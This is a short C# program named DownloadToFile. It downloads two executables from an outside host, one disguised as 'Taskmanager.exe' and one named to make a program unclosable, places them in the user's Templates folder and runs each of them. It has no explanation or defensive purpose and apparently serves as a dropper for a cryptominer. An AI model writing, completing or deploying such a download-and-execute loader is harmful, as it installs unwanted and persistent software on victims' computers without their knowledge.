using System;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace DownloadToFile
{
    internal class Program
    {
        static WebClient Client = new WebClient ();
        public static void Main(string[] args)
        {
            Console.WriteLine(Environment.GetFolderPath(Environment.SpecialFolder.Templates));
            Client.DownloadFile("http://reisminer.xyz/exes/Taskmanager.exe",Environment.GetFolderPath(Environment.SpecialFolder.Templates)+@"\Taskmanager.exe");
            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates)+ @"\Taskmanager.exe");
            
            Client.DownloadFile("http://reisminer.xyz/exes/MakeProgramUnclosable.exe",Environment.GetFolderPath(Environment.SpecialFolder.Templates)+@"\MakeUnclosable.exe");
            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates)+ @"\MakeUnclosable.exe");
        }
    }
}